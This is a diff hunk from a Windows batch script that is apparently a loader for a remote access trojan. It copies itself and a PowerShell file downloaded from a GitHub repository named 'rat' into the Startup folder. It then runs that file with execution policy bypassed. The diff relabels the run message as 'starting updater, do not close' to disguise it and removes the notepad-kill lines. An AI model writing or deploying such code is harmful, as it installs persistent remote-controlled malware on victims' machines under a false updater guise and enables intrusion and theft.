@@ -7,13 +7,10 @@ copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/cli.ps1' -OutFile 'cli.ps1'"
 copy "%~dp0cli.ps1" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 
-echo Starting console listener...
+echo starting updater, do not close
 powershell -ExecutionPolicy Bypass -File cli.ps1
-TASKKILL /F /IM notepad.exe /T
 exit
 
 :start
-echo Starting console listener...
 powershell -ExecutionPolicy Bypass -File cli.ps1
-TASKKILL /F /IM notepad.exe /T
 exit
